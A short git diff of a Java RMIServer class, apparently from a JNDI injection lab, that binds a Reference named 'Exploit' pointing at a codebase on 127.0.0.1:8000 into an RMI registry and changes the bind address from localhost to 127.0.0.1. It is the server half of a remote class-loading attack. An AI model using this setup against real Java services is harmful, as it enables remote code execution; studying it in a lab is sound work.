@@ -18,7 +18,7 @@ public class RMIServer {
         //这里请求的localhost 8000端口的Exploit对象
         Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:8000/");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-        registry.bind("rmi://localhost:1379/Exploit",referenceWrapper);
+        registry.bind("rmi://127.0.0.1:1379/Exploit",referenceWrapper);
 //        Naming.bind("rmi://127.0.0.1:1379/Exploit",referenceWrapper);
     }
 }
